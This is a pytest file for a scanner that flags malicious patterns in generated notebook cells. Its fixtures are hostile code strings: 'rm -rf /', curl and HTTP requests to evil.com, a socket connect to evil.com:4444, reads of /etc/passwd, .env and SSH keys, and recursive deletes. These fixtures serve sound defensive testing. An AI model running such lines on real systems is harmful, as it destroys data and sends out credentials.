"""
Notebook scanner tests — verifies detection of malicious patterns in generated code cells.
Run: cd backend && python -m pytest ../tests/backend/test_notebook_scanner.py -v
"""
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../../backend"))

from notebook_scanner import scan_notebook


def _cells(*sources):
    """Helper: create cell list from code strings."""
    return [{"type": "code", "source": s} for s in sources]


# ── Detection tests ──────────────────────────────────────────────────────


def test_detects_os_system():
    cells = _cells("import os\nos.system('rm -rf /')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("os.system" in f["pattern"] for f in findings)


def test_detects_subprocess_run():
    cells = _cells("import subprocess\nsubprocess.run(['curl', 'evil.com'])")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("subprocess" in f["pattern"] for f in findings)


def test_detects_subprocess_popen():
    cells = _cells("from subprocess import Popen\nPopen(['sh', '-c', 'whoami'])")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_eval():
    cells = _cells("result = eval(user_input)")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("eval" in f["pattern"] for f in findings)


def test_detects_exec():
    cells = _cells("exec(compile(code, '<string>', 'exec'))")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("exec" in f["pattern"] for f in findings)


def test_detects_dunder_import():
    cells = _cells("mod = __import__('os')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("__import__" in f["pattern"] for f in findings)


def test_detects_open_sensitive_path():
    cells = _cells("f = open('/etc/passwd', 'r')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    assert any("open" in f["pattern"] for f in findings)


def test_detects_open_env_file():
    cells = _cells("data = open('.env').read()")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_open_ssh():
    cells = _cells("key = open('~/.ssh/id_rsa').read()")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_requests_get():
    cells = _cells("import requests\nrequests.get('http://evil.com/steal')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_urllib_request():
    cells = _cells("import urllib.request\nurllib.request.urlopen('http://evil.com')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_socket_connect():
    cells = _cells("import socket\ns = socket.socket()\ns.connect(('evil.com', 4444))")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_shutil_rmtree():
    cells = _cells("import shutil\nshutil.rmtree('/important')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


def test_detects_os_remove():
    cells = _cells("import os\nos.remove('/etc/hosts')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1


# ── Clean code should pass ───────────────────────────────────────────────


def test_clean_numpy_code_no_findings():
    cells = _cells(
        "import numpy as np\nimport matplotlib.pyplot as plt\n"
        "x = np.linspace(0, 10, 100)\ny = np.sin(x)\nplt.plot(x, y)\nplt.show()"
    )
    findings = scan_notebook(cells)
    assert findings == []


def test_markdown_cells_ignored():
    cells = [
        {"type": "markdown", "source": "# eval() is a dangerous function\nos.system() should not be used"},
        {"type": "code", "source": "x = 1 + 1"},
    ]
    findings = scan_notebook(cells)
    assert findings == []


# ── Finding structure ────────────────────────────────────────────────────


def test_finding_has_required_fields():
    cells = _cells("os.system('whoami')")
    findings = scan_notebook(cells)
    assert len(findings) >= 1
    f = findings[0]
    assert "cell_index" in f
    assert "line" in f
    assert "pattern" in f
    assert "severity" in f
    assert "description" in f
    assert f["severity"] in ("critical", "warning")


def test_correct_cell_index():
    cells = [
        {"type": "code", "source": "x = 1"},
        {"type": "code", "source": "os.system('bad')"},
    ]
    findings = scan_notebook(cells)
    assert findings[0]["cell_index"] == 1
